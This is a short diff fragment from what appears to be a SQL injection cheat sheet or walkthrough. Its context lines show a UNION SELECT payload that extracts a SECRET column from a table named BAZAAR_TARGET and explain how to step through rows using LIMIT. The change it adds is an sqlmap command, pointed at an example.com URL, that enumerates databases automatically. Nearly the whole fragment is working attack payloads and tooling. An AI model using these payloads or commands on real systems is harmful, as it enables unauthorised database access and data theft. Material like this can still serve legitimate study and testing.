@@ -35,7 +35,8 @@ Column: SECRET
 ?id=-1+UNION+SELECT+1,SECRET,3+FROM+BAZAAR_TARGET+LIMIT+0,1--+
 Note: Use LIMIT+x,1 to enumerate more.
 
-
+# Automate the entire process.
+sqlmap -u "https://example.com/page?id=1" --dbs --batch
 
 
 
